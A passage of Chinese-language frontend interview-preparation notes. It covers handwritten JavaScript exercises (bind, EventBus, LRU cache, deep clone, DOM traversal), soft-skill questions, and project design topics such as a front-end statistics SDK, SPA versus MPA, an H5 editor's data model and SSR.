- 创建一个空对象 obj，继承构造函数的原型
- 执行构造函数（将 obj 作为 this）
- 返回 obj

## 实现 new

代码参考 new.ts

## 面试连环问：Object.create 和 {} 的区别

`Object.create` 可以指定原型，创建一个空对象。<br>
`{}` 就相当于 `Object.create(Object.prototype)` ，即根据 `Object` 原型的空对象。

PS：对 JS 原型和原型链还不了解的需要抓紧恶补。


# 编写高质量代码\05-遍历DOM树.md
# 遍历 DOM 树

## 题目

写一个函数遍历 DOM 树，分别用深度优先和广度优先

PS：注意回顾 “Node 和 Element 和区别”

## 深度优先 vs 广度优先

![](./img/dom-tree.png)

深度优先的结果 `<div> <p> "hello" <b> "world" <img> 注释 <ul> <li> "a" <li> "b"`

广度优先的结果 `<div> <p> <img> 注释 <ul> "hello" <b> <li> <li> "world" "a" "b"`

## 深度优先

一般通过递归实现，代码参考 dom-traverse.ts

## 广度优先

一般通过队列实现，代码参考 dom-traverse.ts

## 解答

- 深度优先，递归
- 广度优先，队列

## 连环问：深度优先可以不用递归吗？

深度优先遍历，可以使用栈代替递归，递归本质上就是栈。代码参考 dom-traverse.ts

递归和非递归哪个更好？
- 递归逻辑更加清晰，但容易出现 `stack overflow` 错误（可使用`尾递归`，编译器有优化）
- 非递归效率更高，但使用栈，逻辑稍微复杂一些


# 编写高质量代码\06-手写lazyman.md
#### 手写 LazyMan

##### 题目

手写 LazyMan ，实现 `sleep` 和 `eat` 两个方法，支持链式调用。
代码示例：

```js
const me = new LazyMan('双越')
me.eat('苹果').eat('香蕉').sleep(5).eat('葡萄') // 打印结果如下：

// '双越 eat 苹果'
// '双越 eat 香蕉'
// （等待 5s）
// '双越 eat 葡萄'
```

###### 设计 class 框架

```js
class LazyMan {
    private name: string
    constructor(name: string) {
        this.name = name
    }
    eat(x: string) {
        // 打印 eat 行为

        return this // 支持链式调用
    }
    sleep(seconds: number) {
        // 等待 10s 的处理逻辑

        return this // 支持链式调用
    }
}
```

###### 处理 sleep 逻辑

初始化一个任务队列，执行 `eat` 和 `sleep` 是都往队列插入一个函数。依次执行队列的任务，遇到 `sleep` 就延迟触发 `next` 。

![](./img/sleep.png)

代码参考 lazy-man.ts

###### 总结

- 链式调用
- 任务队列
- 延迟触发


# 编写高质量代码\07-curry-add.md
# curry add

## 题目

写一个 `curry` 函数，可以把其他函数转为 curry 函数

```js
function add(a, b, c) { return a + b + c }
add(1, 2, 3) // 6

const curryAdd = curry(add)
curryAdd(1)(2)(3) // 6
```

## 解答

代码参考 curry.ts

## 总结

- 判断参数长度
- 中间态返回函数，最后返回执行结果
- 如用 this 慎用箭头函数


# 编写高质量代码\08-手写instanceof.md
# 手写 instanceof

## 题目

instanceof 的原理是什么，请用代码来表示

## 原型链

![](./img/原型链.png)

## instanceof 原理

例如 `a instanceof b` 就是：顺着 `a` 的 `__proto__` 链向上找，能否找到 `b.prototype`

代码参考 instanceof.ts

## 总结

- 原型链
- 循环判断


# 编写高质量代码\09-手写函数bind.md
# 手写函数 bind

## 题目

请手写实现函数 bind

## bind 应用

- 返回一个新的函数（旧函数不会更改）
- 绑定 `this` 和部分参数
- 箭头函数，无法改变 `this` ，只能改变参数

```js
function fn(a, b, c) {
    console.log(this, a, b, c)
}
const fn1 = fn.bind({x: 100})
fn1(10, 20, 30) // {x: 100} 10 20 30
const fn2 = fn.bind({x: 100}, 1, 2)
fn2(10, 20, 30) // {x: 100} 1 2 10 （注意第三个参数变成了 10）

fn(10, 20, 30) // window 10 20 30 （旧函数不变）
```

## 解答

代码参考 bind.ts

要点
- 返回新函数
- 拼接参数（bind 参数 + 执行参数）
- 重新绑定 `this`

## 连环问：手写函数 call 和 apply

`bind` 生成新函数，暂不执行。而 `call` `apply` 会直接立即执行函数
- 重新绑定 `this` （箭头函数不支持）
- 传入参数

```js
function fn(a, b, c) {
    console.log(this, a, b, c)
}
fn.call({x: 100}, 10, 20, 30)
fn.apply({x: 100}, [10, 20, 30])
```

代码参考 call-apply.ts

- 使用 `obj.fn` 执行，即可设置 `fn` 执行时的 `this`
- 考虑 `context` 各种情况
- 使用 `symbol` 类型扩展属性 

注意：有些同学用 `call` 来实现 `apply` （反之亦然），这样是不符合面试官期待的。


# 编写高质量代码\10-手写event-bus.md
# 手写 EventBus

Bus 不是“车”，而是“总线”

## 题目

请手写 EventBus 自定义事件，实现 `no` `once` `emit` 和 `off`

## EventBus 功能

```js
const event = new EventBus()

function fn1(a, b) { console.log('fn1', a, b) }
function fn2(a, b) { console.log('fn2', a, b) }
function fn3(a, b) { console.log('fn3', a, b) }

event.on('key1', fn1)
event.on('key1', fn2)
event.once('key1', fn3)
event.on('xxxxxx', fn3)

event.emit('key1', 10, 20) // 触发 fn1 fn2 fn3

event.off('key1', fn1)

event.emit('key1', 100, 200) // 触发 fn2
```

## 实现

- `class` 结构
- 注意区分 `on` 和 `off`

代码参考 event-bus.ts

## 连环问：EventBus 里的数组可以换成 Set 吗？

数组和 Set 比较 （除了语法 API）
- 数组，有序结构，查找、中间插入、中间删除比较慢
- Set 不可排序的，插入和删除都很快

Set 初始化或者 `add` 时是一个有序结构，但它无法再次排序，没有 `index` 也没有 `sort` 等 API 

验证
- 生成一个大数组，验证 `push` `unshift` `includes` `splice`
- 生成一个大 Set ，验证 `add` `delete` `has`

答案：不可以，Set 是不可排序的，如再增加一些“权重”之类的需求，将不好实现。

## Map 和 Object

Object 是无序的

```js
const data1 = {'1':'aaa','2':'bbb','3':'ccc','测试':'000'}
Object.keys(data1) // ["1", "2", "3", "测试"]
const data2 = {'测试':'000','1':'aaa','3':'ccc','2':'bbb'};
Object.keys(data2); // ["1", "2", "3", "测试"]
```

Map 是有序的

```js
const m1 = new Map([
    ['1', 'aaa'],
    ['2', 'bbb'],
    ['3', 'ccc'],
    ['测试', '000']
])
m1.forEach((val, key) => { console.log(key, val) })
const m2 = new Map([
    ['测试', '000'],
    ['1', 'aaa'],
    ['3', 'ccc'],
    ['2', 'bbb']
])
m2.forEach((val, key) => { console.log(key, val) })
```

另外，**Map 虽然是有序的，但它的 `get` `set` `delete` 速度非常快**，和 Object 效率一样。它是被优化过的有序结构。


# 编写高质量代码\11-手写LRU.md
# 手写 LRU

## 题目

用 JS 实现一个 LRU 缓存

## LRU 使用

Least Recently Used 最近最少使用<br>
即淘汰掉最近最少使用的数据，只保留最近经常使用的资源。它是一个固定容量的缓存容器。

```js
const lruCache = new LRUCache(2); // 最大缓存长度 2
lruCache.set(1, 1); // 缓存是 {1=1}
lruCache.set(2, 2); // 缓存是 {1=1, 2=2}
lruCache.get(1);    // 返回 1
lruCache.set(3, 3); // 该操作会使得关键字 2 作废，缓存是 {1=1, 3=3}
lruCache.get(2);    // 返回 null
lruCache.set(4, 4); // 该操作会使得关键字 1 作废，缓存是 {4=4, 3=3}
lruCache.get(1);    // 返回 null
lruCache.get(3);    // 返回 3
lruCache.get(4);    // 返回 4
```

## 分析

- 哈希表，即 `{ k1: v1, k2: v2, ... }` 形式。可以 `O(1)` 事件复杂度存取 `key` `value`
- 有序。可以根据最近使用情况清理缓存

JS 内置的数据结构类型 `Object` `Array` `Set` `Map` ，恰好 `Map` 符合这两条要求

## Map 是有序的

Map 有序，Object 无序

## 实现

代码参考 LRU.ts

注意，`get` `set` 时都要把操作数据移动到 Map 最新的位置。

## 扩展

实际项目中可以使用第三方 lib
- https://www.npmjs.com/package/quick-lru
- https://www.npmjs.com/package/lru-cache
- https://www.npmjs.com/package/tiny-lru
- https://www.npmjs.com/package/mnemonist

## 连环问：不用 Map 如何实现 LRU cache ？

LRU cache 是很早就有的算法，而 Map 仅仅是这几年才加入的 ES 语法。

### 使用 Object 和 Array

根据上文的分析，两个条件
- 哈希表，可以用 `Object` 实现
- 有序，可以用 `Array` 实现

```js
// 执行 lru.set('a', 1) lru.set('b', 2) lru.set('c', 3) 后的数据

const obj1 = { value: 1, key: 'a' }
const obj2 = { value: 2, key: 'b' }
const obj3 = { value: 3, key: 'c' }

const data = [obj1, obj2, obj3]
const map = { 'a': obj1, 'b': obj2, 'c': obj3 }
```

模拟 `get` `set` 操作，会发现几个问题，都来自于数组
- 超出 cache 容量时，要移除最早的元素，数组 `shift` 效率低
- 每次 `get` `set` 时都要把当前元素移动到最新的位置，数组 `splice` 效率低

### Array 改为双向链表

数组有问题，就需要使用新的数据结构 **双向链表**

```ts
Interface INode {
    value: any
    next?: INode
    prev?: INode
}
```

双向链表可以快速移动元素。末尾新增元素 D 很简单，开头删除 A 元素也很简单。

![](./img/双向链表-1.png)

要把中间的元素 B 移动到最后（如 LRU `set` `get` 时移动数据位置），只需要修改前后的指针即可，效率很高。

![](./img/双向链表-2.png)

### 实现

代码参考 LRU2.ts

注意事项
- 数据结构如何定义，`data` 和链表分别存储什么
- 双向链表的操作（非常繁琐，写代码很容易出错，逻辑一定要清晰！！！）
- 链表 `node` 中要存储 `data.key` ，否则删除 `data` 需要遍历、效率低


# 编写高质量代码\12-深拷贝.md
#### 深拷贝

##### 题目

手写 JS 深拷贝

###### 分析

这是一个很常见的问题，看似也很简单，但是如果考虑到“高质量代码”的要求，写起来还是挺麻烦的。<br>
别说写代码，就本节所有的情况你能否考虑全面，这都不一定。

###### 错误答案1

使用 `JSON.stringify` 和 `JSON.parse`
- 无法转换函数
- 无法转换 `Map` `Set`
- 无法转换循环引用

PS：其实普通对象使用 JSON API 的运算速度很快，但功能不全

###### 错误答案2

使用 `Object.assign` —— 这根本就不是深拷贝，是浅拷贝 ！！！

###### 错误答案3

只考虑了普通的对象和数组
- 无法转换 `Map` `Set`
- 无法转换循环引用

###### 正确答案

参考代码 clone-deep.ts

---

循环引用
Map Set 函数


# 编写高质量代码\13-文本小节-dom转vdom.md
# DOM 转 VDOM

注：文字小节

## 题目

讲以下 DOM 结构转换为 vnode 数据

```html
<div id="div1" style="border: 1px solid #ccc; padding: 10px;">
    <p>一行文字<a href="xxx.html" target="_blank">链接</a></p>
    <img src="xxx.png" alt="图片" class="image"/>
    <button click="clickHandler">点击</button>
</div>
```

## 答案

vdom 就是用 JS 对象的形式来表示 DOM 结构。vnode 即对应着 DOM 结构的一个 node 节点。

```js
const vnode = {
    tag: 'div', // <div>
    data: {
        id: 'div1',
        style: {
            'border': '1px solid #ccc',
            'padding': '10px'
        }
    },
    children: [
        {
            tag: 'p', // <p>
            data: {},
            children: [
                '一行文字',
                {
                    tag: 'a', // <a>
                    data: {
                        href: 'xxx.html',
                        target: '_blank'
                    },
                    children: ['链接']
                }
            ]
        },
        {
            tag: 'img', // <img>
            data: {
                className: 'image', // 注意，这里要用 className
                src: 'xxx.png',
                alt: '图片'
            }
        },
        {
            tag: 'button', // <button>
            data: {
                events: {
                    click: clickHandler
                }
            }
            children: ['点击']
        }
    ]
}
```

## 注意事项

- vdom 结构没有固定的标准，例如 `tag` 可以改为 `name` ，`data` 可以改为 `props` 。只要能合理使用 JS 数据表达 DOM 即可。
- `style` 和 `events` 要以对象的形式，更易读，更易扩展
- `class` 是 ES 内置关键字，要改为 `className` 。其他的还有如 `for` 改为 `htmlFor`


# 编写高质量代码\14-总结.md
# 总结

## 内容总结

本章讲解编写高质量代码的面试题，即常见的“手写代码”面试题。有比较基础的类型判断、手写 `new`，也有比较复杂的 LazyMan 和 LRU 缓存。

## 划重点

- 编码规范性
- 功能完整性
- 鲁棒性（健壮性）

## 注意事项

- 能写单元测试的，就直接写出来


# 软技能\00-开始.md
# 开始

## 为何考察

考察个人沟通，考察个人学习能力，考察如何总结项目难点等

## 考察重点

- 沟通能力
- 学习能力

## 注意事项

- 如果技术面试不错，千万不要因为软技能掉链子


# 软技能\01-是否看过红宝书.md
# 是否看过红宝书

注：文字小节

## 题目

是否看过红宝书？

## 分析

红宝书《Javascript 高级程序设计》是前端开发中最重要的一本书籍，面试官问这个问题，是观察你的学习能力和学习习惯。

此时你如果回答“没有看过”，那显然是不太符合面试官预期的。虽然不会因此而拒绝你，但如果之前已经累计了一些劣势，那这个问题有可能就是压倒骆驼的最后一根稻草。

## 如果你看过

建议你再重新回顾一下这本书，写一篇《学习笔记》文章，这样记忆更深刻。毕竟跟面试官说看过，得说出一些实际的内容和干货。

## 如果没看过

如果面试在即，实在没有时间去买来看，那就看一看这本书的目录，再去查一查别人写的读书笔记。大概了解一下这本书的内容。

然后你可以回复面试官：我没有详细看过，但我了解这本书的目录和主要内容 —— 这种答复也是可以接受的，如果你能说出一些实际内容。

## 扩展

日常学习的途径
- 看博客 - 关注技术动态，不求甚解
- 看书 - 平心静气，细致学习
- 看视频 - 快速了解，追求效率，少走弯路

最后记住一句话：**浅层学习看输入，深入学习看输出**。无论什么样的学习途径，最后都要输出，这样才能转化为你自己的知识。


# 软技能\02-如何做code-review.md
# code review

## 题目

如何做 code review ？

## 分析

code review（简称 CR ）即代码走查。领导对下属的代码进行审查，或者同事之间相互审查。
CR 已经是现代软件研发流程中非常重要的一步，持续规范的执行 CR 可以保证代码质量，避免破窗效应。

## CR 检查什么

- 代码规范（eslint 能检查一部分，但不是全部，如：变量命名）
- 重复逻辑抽离、复用
- 单个函数过长，需要拆分
- 算法是否可优化?
- 是否有安全漏洞?
- 扩展性如何？
- 是否和现有的功能重复了？
- 是否有完善的单元测试
- 组件设计是否合理

## 何时 CR

提交 PR（或者 MR）时，看代码 diff 。给出评审意见，或者评审通过。可让领导评审，也可以同事之间相互评审。<br>
评审人要负责，不可形式主义。万一这段代码出了问题，评审人也要承担责任。

例行，每周组织一次集体 CR ，拿出几个 PR 或者几段代码，大家一起评审。<br>
可以借机来统一评审规则，也可以像新人来演示如何评审。

## 持续优化

评审的问题要汇总起来，整理一个代码规范和常见问题，持续积累。持续宣讲，并让新成员学习。

## 之前没做过 CR 怎么办

记住本节的内容，对 CR 有大概了解。至少面试时能讲出一点内容。

要如实回复面试官：我没做过 CR ，因为公司环境 xxx 。所以，我才想着去找个更大平台，开阔事业，多实践 —— 把它转换为你离职、要求进步的理由。


# 软技能\03-如何学习一门新语言.md
# 学习新语言

## 题目

如何学习一门新语言，需要考虑哪些方面？

## 分析

考察你的学习能力和习惯，有没有在学习中积累到经验和方法论。毕竟，前端需要学习的东西太多了。

## 答案

- 应用场景和优势 —— 存在的价值
- 语法（变量和常量，数据类型，运算符，函数等）
- 内置 API
- 第三方库和框架
- 开发环境和调试工具
- 线上环境和发布过程


# 软技能\04-你目前有和不足.md
# 你的不足

## 题目

你目前有何不足的地方？

## 分析

如果你被问到这个问题，那恭喜你面试快要通过了。一般在 3-4 面，或者 hr 面试时会问道这个问题。<br>
无论是 hr 还是技术人员问，你都要从技术角度来回答这个问题，说自己技术上的不足。不要扯其他方面的，容易掉到坑里。

你不用担心 hr 听不懂技术，听不懂更好。

## 不足，不要乱说

要限定一个范围
- 技术方面的
- 非核心技术栈的，即有不足也无大碍
- 些容易弥补的，后面才能“翻身”

错误的示范
- 我爱睡懒觉、总是迟到 —— 非技术方面
- 我自学的 Vue ，但还没有实践过 —— 核心技术栈
- 我不懂 React —— 技术栈太大，不容易弥补

正确的示范
- 脚手架，我还在学习中，还不熟练
- nodejs 还需要继续深入学习

## 最后，要把话题反转回来

不能只说不足，就截止了。一定要通过不足，来突出自己的解决方案，以及未来的预期。<br>
这样给人的印象是：正式了自己的不足 + 有学习的态度 —— 非常好！

## 答案

套这个模板
- 我觉得自己在 xxx 方面还存在不足
- 但我已经意识到并且开始学习 xxx
- 争取在 xxx 时候把这块补齐


# 软技能\05-总结.md
# 总结

## 内容总结

本章讲解软技能相关面试题。
考察个人沟通，考察个人学习能力，考察如何总结项目难点等

## 考察重点

- 沟通能力
- 学习能力

## 注意事项

- 如果技术面试不错，千万不要因为软技能掉链子


# 项目设计\00-开始.md
# 开始

面试官给出一个项目需求或者功能，让候选人做技术方案设计，考察综合能力。
本章将通过多个面试题，讲解如何进行项目设计，包括抽象数据模型，总结功能和流程，制定技术方案等

## 为何要考察

面试官给出一个项目需求或者功能，让候选人做技术方案设计，考察综合能力。

## 考察重点

- 识别需求，转化为功能
- 功能模块拆分
- 数据结构设计

## 注意事项

看整体设计，不要追求细节

## 看几个问题

参考视频小节。


# 项目设计\01-文本小节-项目负责人的职责.md
# 项目负责人的职责

注：文字小节

## 题目

作为项目前端技术负责人，主要的职责是什么？

## 目标

项目前端技术负责人，将负责和项目前端开发相关的所有事情，不仅仅是前端范围内的，也不仅仅是开发的事宜。

目标：保证项目按时、按质量的交付上线，以及上线之后的安全稳定运行。

## 职责

### 把控需求

新项目开始、或者新功能模块开始时要参与需求评审，认真审阅需求的详细内容，给出评审意见，提出问题。自己已经同意的需求要能保证按时、按质量的完成。

评审需求需要你能深入理解项目的业务，不仅仅是自己负责的功能，还有上下游全局的串联。所以，一入职的新人无论技术能力多好，都无法立刻作为项目技术负责人，他还需要一段时间的业务积累和熟练。PS：除非他在其他公司已经是这个方面的业务专家。

需求评审之后，还可能有 UI 设计图的评审，也要参与，提出自己的意见和问题。保证评审通过的 UI 设计图都能保质保量的开发出来。

需求和 UI 设计图评审完之后，还要给出开发的排期。此时要全面考虑，不仅仅要考虑开发时间，还有内部测试、单元测试的时间，以及考虑一些延期的风险，多加几天的缓冲期。

最后，在项目进行过程中，老板或者 PM 有可能中途插入新需求。此时要积极沟通，重新评估，还要争取延长项目开发周期。需求增加了，肯定周期也要延长一些。

### 技术方案设计

> 需求指导设计，设计指导开发。

需求和 UI 设计图确定之后，要先进行技术方案设计，写设计文档，评审，通过之后再开发。技术方案设计应该包含核心数据结构的设计，核心流程的设计，核心功能模块的组织和实现。评审时看看这些有没有不合理、隐患、或者和别人开发重复了。

技术方案设计还要包括和其他对接方的，如和服务端、客户端的接口格式。也要叫他们一起参与评审，待他们同意之后再开发。

### 开发

作为技术负责人，不应该把自己的主要精力放在代码开发上，但也不能完全不写代码。
应该去写一些通用能力，核心功能，底层逻辑的代码。其他比较简单的业务代码，可以交给项目成员来完成。

### 监督代码质量

技术负责人，可能会带领好多人一起编写代码，但他要把控整个项目的代码质量。例如：
- 制定代码规范
- 定期组织代码审核
- CI 时使用自动化单元测试

### 跟踪进度

每天都组织 10 分钟站会，收集当前的进度、风险和问题。如有延期风险，要及时汇报。

不仅仅要关心前端开发的进度，还要关心上下游。例如上游的 UI 设计图延期，将会导致前端开发时间不够，进而导致测试时间不够，甚至整个项目延期。

### 稳定安全的运行

上线之后，要能实时把控项目运行状态，是否稳定、安全的运行。万一遇到问题，要第一时间报警。

所以，项目中要增加各种统计和监控功能，例如流量统计、性能统计、错误监控，还有及时报警的机制。

## 总结

- 把控需求
- 技术方案设计
- 开发
- 监督代码质量
- 跟踪进度
- 稳定安全的运行


# 项目设计\02-忽略.md
忽略本节


# 项目设计\03-前端统计sdk.md
# 前端统计 sdk

## 题目

要让你设计一个前端统计 SDK ，你会如何设计？

## 分析

前端统计的范围
- 访问量 PV
- 自定义事件（如统计一个按钮被点击了多少次）
- 性能
- 错误

统计数据的流程 （只做前端 SDK ，但是要了解全局）
- 前端发送统计数据给服务端
- 服务端接受，并处理统计数据
- 查看统计结果

## 代码结构

SDK 要用于多个不同的产品，所以初始化要传入 `productId`

```js
class MyStatistic {
    private productId: number

    constructor(productId: number = 0) {
        if (productId <= 0) {
            throw new Error('productId is invalid')
        }
        this.productId = productId // 产品 id （SDK 会被用于多个产品）

        this.initPerformance() // 性能统计
        this.initError() // 监听错误
    }
    private send(url: string, paramObj: object = {}) {
        // TODO 发送统计数据
    }
    private initPerformance() {
        // TODO 性能统计
    }
    private initError() {
        // TODO 监听全局错误（有些错误需要主动传递过来，如 Vue React try-catch 的）
    }
    pv() {
        // TODO 访问量 PV 统计
    }
    event(key: string, value: string) {
        // TODO 自定义事件
    }
    error(key: string, info: object = {}) {
        // TODO 错误统计
    }
}
```

用户使用

```js
const myStatistic = new MyStatistic('abc')
```

## 发送数据

发送统计数据，用 `<img>` —— 浏览器兼容性好，没有跨域限制

```js
private send(url: string, paramObj: object = {}) {
    // 追加 productId
    paramObj.productId = this.productId

    // params 参数拼接为字符串
    const paramArr = []
    for (let key in paramObj) {
        const value = paramObj[key]
        paramArr.push(`${key}=${value}`)
    }

    const img = document.createElement('img')
    img.src = `${url}?${paramArr.join('&')}`
}
```

如果再精细一点的优化，`send` 中可以使用 `requestIdleCallback` （兼容使用 `setTimeout`）

## 自定义事件统计

```js
event(key: string, value: string) {
    const url = 'xxx' // 接受自定义事件的 API
    this.send(url, { key, value }) // 发送
}
```

用户使用

```js
// 如需要统计“同意” “不同意” “取消” 三个按钮的点击量，即可使用自定义事件统计
$agreeBtn.click(() => {
    // ...业务逻辑...
    myStatistic.event('some-button', 'agree') // 其他不同的按钮，传递不同的 value (如 'refuse' 'cancel')
})
```

## 访问量 PV

PV 可以通过自定义事件的方式。但是为了避免用户重复发送，需要加一个判断

```js
// 定义一个全局的 Set ，记录已经发送 pv 的 url
const PV_URL_SET = new Set()
```

```js
pv() {
    const href = location.href
    if (PV_URL_SET.has(href)) return

    this.event('pv', '') // 发送 pv

    PV_URL_SET.add(href)
}
```

用户使用

```js
myStatistic.pv()
```

【注意】PV 统计需要让用户自己发送吗，能不能在 DOMContentLoaded 时自动发送？—— 最好让用户发送，因为 SPA 中切换路由也可能发送 PV

## 性能统计

通过 `console.table( performance.timing )` 可以看到网页的各个性能

![](./img/performance.png)

```js
private initPerformance() {
    const url = 'yyy' // 接受性能统计的 API
    this.send(url, performance.timing) // 全部传给服务端，让服务端去计算结果 —— 统计尽量要最原始数据，不要加工处理
}
```

PS：想要得到全面的性能数据，要在网页加载完成之后（ DOMContentLoaded 或 onload ）去初始化 `myStatistic`

## 错误统计

监听全局操作

```js
private initError() {
    // 全局操作
    window.addEventListener('error', event => {
        const { error, lineno, colno } = event
        this.error(error, { lineno, colno })
    })
    // Promise 未 catch 的报错 （ 参考 unhandledrejection.html ）
    window.addEventListener("unhandledrejection", event => {
        this.error(event.reason)
    })
}
```

被开发这主动收集的错误，需要调用 API 来统计

```js
error(error: Error, info: object = {}) {
    // error 结构 { message, stack }
    // info 是附加信息

    const url = 'zzz' // 接受错误统计的 API
    this.send(url, Object.assign(error, info))
}
```

用户使用

```js
// try catch
try {
    100()
} catch (e) {
    myStatistic.error(e)
}

// Vue 错误监听
app.config.errorHandler = (error, instance, info) => {
    myStatistic.error(error, { info })
}

// React 错误监听
componentDidCatch(error, errorInfo) {
    myStatistic.error(error, { info: errorInfo })
}
```

## 总结

- 自定义事件（包括 PV）
- 性能统计
- 报错统计

PS：以上是一个统计 SDK 的基本估计，可以应对面试，实际工作中还可能需要进一步完善很多细节。

## 连环问：sourcemap 有什么作用？该如何配置

遇到 JS 报错的问题，就离不开 sourcemap

### 背景
- JS 上线之前要合并、混淆和压缩。例如 jquery 的线上代码 https://www.bootcdn.cn/jquery/
- 压缩之后，一旦线上有报错，通过行、列根本找不到源代码的位置，不好定位错误
- sourcemap 就是用于解决这个问题。可以看 jquery 的 sourcemap 文件 https://www.jsdelivr.com/package/npm/jquery?path=dist

### 示例
一个网页中引用了 CDN jquery.min.js ，通过 chrome Sources 即可看到之前源码的样子。<br>
寻找 sourcemap 有两种方式：1. 同目录下的同名文件；2. js 文件最后一样指定（如 wangEditor js）

![](./img/sourcemap1.png)

### 配置
sourcemap 是在打包、压缩 js 时生成，通过 webpack 的打包工具即可配置。（可以在 `js-code` 代码环境中测试）<br>
webpack 通过 `devtool` 来配置 sourcemap ，有多种选择 https://webpack.docschina.org/configuration/devtool/#devtool
- 不用 `devtool` - 正常打包，不会生成 sourcemap 文件
- `eval` - 所有代码都放在 `eval(...)` 中执行，不生成 sourcemap 文件
- `source-map` - 生成单独的 sourcemap 文件，并在 js 文件最后指定
- `eval-source-map` - 代码都放在 `eval(...)` 中执行，sourcemap 内嵌到 js 代码中，不生成独立的文件
- `inline-source-map` - sourcemap 以 base64 格式插入到 js 末尾，不生成单独的文件
- `cheap-source-map` - sourcemap 只包含行信息，没有列信息（文件体积更小，生成更快）
- `eval-cheap-source-map` - 同上，但是所有代码都放在 `eval(...)` 中执行

推荐
- 开发和测试 `eval` `eval-source-map` `eval-cheap-source-map` —— 追求效率
- 生产环境 `source-map` 或者不产出 sourcemap —— 看个人需求

### 注意

公司实际项目的 sourcemap 可用于内部反查 bug ，但不要泄漏。否则等于源码泄漏了。<br>
开源项目的 sourcemap 文件也是开源的。

只需要了解 sourcemap 的作用和配置即可，原理不用掌握。


# 项目设计\04-SPA-MPA.md
# SPA MPA

## 题目

何时用 SPA 何时用 MPA ？

## 分析

- SPA - Single-page Application 单页面应用，只有一个 html 文件，用前端路由切换功能
- MPA - Multi-page Application 多页面应用，每个页面是单独的 html 文件

现在基于 React Vue 开发时，大部分产出的都是 SPA ，很少会产出 MPA 。<br>
但并不是所有的场景都适用于 SPA ，项目设计时要确定好，否则后面不好改。

## SPA 适用于一个综合应用

特点
- 功能较多，一个界面展示不完
- 以操作为主，不是以展示为主

举例
- 大型的后台管理系统（阿里云的管理后台）
- 知识库（语雀、腾讯文档）
- 功能较复杂的 WebApp（外卖）

## MPA 适用于孤立的页面

特点
- 功能较少，一个页面展示得开
- 以展示为主，而非操作

举例
- 分享页（微信公众号文章）
- 新闻 App 里的落地页（有可能是用 H5 + hybrid 开发的）

## Webpack 打包

```js
const path = require('path');
const HtmlWebpackPlugin = require('html-webpack-plugin');
const { CleanWebpackPlugin } = require('clean-webpack-plugin');

module.exports = {
  mode: 'production',
  // 多入口
  entry: {
    home: './src/home/index.js',
    product: './src/product/index.js',
    about: './src/about/index.js'
  },
  output: {
    filename: 'js/[name].[contentHash].js', // name 即 entry 的 key
    path: path.resolve(__dirname, './dist')
  },
  plugins: [
    new CleanWebpackPlugin(),

    // 三个页面
    new HtmlWebpackPlugin({
      title: '首页',
      template: './template/index.html',
      filename: 'home.html',
      chunks: ['home']
    }),
    new HtmlWebpackPlugin({
      title: '产品',
      template: './template/product.html',
      filename: 'product.html',
      chunks: ['product']
    }),
    new HtmlWebpackPlugin({
      title: '关于',
      template: './template/about.html',
      filename: 'about.html',
      chunks: ['about']
    })
  ]
}
```

## 扩展：技术是一回事，怎么做是另外的事儿

讲一个故事，说明这个问题，请大家注意。

我之前的一个同事，他技术很好。
我就问他一个问题：你觉得在项目发布之前，最需要做的是什么？<br>
他回复是：1. 扩展性还不太好，得增强一下；2. 解决当前的 bug 。

然后我继续追问：1. 你觉得扩展性不好用，是扩展什么功能不好用，举个例子来说明？2. 目前记录的这些 bug ，那几个是高优的？<br>
然后他没有回答出来。

技术人员有这个想法很正常，我之前也是。<br>
我刚毕业那 2 年，对自己维护的一个系统提出了很多升级意见，都是自己从书上、竞品参考的。但领导问：这些如何实际应用到我们的项目？<br>
我就回答不上来了。


# 项目设计\05-H5编辑器.md
# H5 编辑器

低代码，现在流行

## 题目

![](./img/H5编辑器.png)

这是一个 H5 编辑器，用 vue + vuex 来实现，几个问题：
- 在点“保存”按钮的时候，往服务端传递的**数据结构**是什么样子的？
- 如何保证画布和属性面板是同步更新的？
- 如果在扩展一个“图层”面板，数据结构该怎么设计？

## 大家的答案

第一个问题，大家的答案往往都是这样的：

```js
{
    components: {
        'text1': {
            type: 'text',
            value: '文本1',
            color: 'red',
            fontSize: '16px'
        },
        'text2': {
            type: 'text',
            value: '文本2',
            color: 'red',
            fontSize: '16px'
        },
        'img1': {
            type: 'image',
            src: 'xxx.png',
            width: '100px'
        }
    }
}
```

第二个问题，大家觉得数据存到 vuex 中，就可以同步更新了 —— 这没错，但具体如何做到呢？很多同学想不出来，或者到这里就懵了。

第三个问题，很多同学觉得应该在 vuex store 中新增一个属性

```js
{
    layer: [
        {
            id: 'text1', // 对应到 components 的 key
            name: '文本1'
        },
        {
            id: 'text2',
            name: '文本2'
        }
    ]
}
```

基于以上回答，总结一下：

- node 结构，不是规范的 vnode 形式
- 组件应该用数组，而不是对象。数组是有序结构
- 都知道存储到 vuex 中即可同步数据，但问题是如何用 vuex 表示当前选中的组件
- 图层，应该是一个 computed 计算出来的索引，而不是一个单独的数据

## 正确的设计思路

vuex store

```js
{
    // 作品
    work: {
        title: '作品标题',
        setting: { /* 一些可能的配置项，用不到就先预留 */ },
        props: { /* 页面 body 的一些设置，如背景色 */ },
        components: [
            // components 要用数组，有序结构

            // 单个 node 要符合常见的 vnode 格式
            {
                id: 'xxx', // 每个组件都有 id ，不重复
                name: '文本1',
                tag: 'text',
                attrs: { fontSize: '20px' },
                children: [
                    '文本1' // 文本内容，有时候放在 children ，有时候放在 attrs 或者 props ，没有标准，看实际情况来确定
                ]
            },
            {
                id: 'yyy',
                name: '图片1',
                tag: 'image',
                attrs: { src: 'xxx.png', width: '100px' },
                children: null
            },
        ]
    },

    // 画布当前选中的组件，记录 id 即可
    activeComponentId: 'xxx'
}
```

vuex getter

```js
{
    layers() => {
        store.work.components.map(c => {
            return {
                id: c.id,
                name: c.name
            }
        })
    }
}
```

总之，基本思路就是：

- 每个组件尽量符合 vnode 规范
- 用数组来组织数据，有序
- 尽量使用引用关系，不要冗余

## 扩展

项目技术方案设计时，数据结构的设计是非常重要的。

不要纠细节，看主要设计

要参考现有标准，而非自造标准 —— 这需要自己有基础知识，有识别能力

---

联想到富文本编辑器的数据结构设计：text 摊平，而不是嵌套。


# 项目设计\06-文本小节-何时使用SSR.md
# 何时使用 SSR

注：文字小节

## 题目

何时使用 SSR ，何时不用？

## 分析

SSR - Server-side render 服务端渲染

SSR 历史悠久，之前的 ASP JSP PHP 就是 SSR 。

之前面试过一个候选人，问他：SSR 有何优点？他回答：SSR 好！ —— 这是完全没有技术思维的回复。<br>
那即便你能回答出 SSR 的优势，我再继续问：SSR 有什么劣势？再继续问：SSR 适用于哪些场景？

借此说明：技术要有合适的应用场景才会有价值。

## SSR 的优势

服务端直出 html
- 性能好
- 对 SEO 优化

## SSR 的劣势

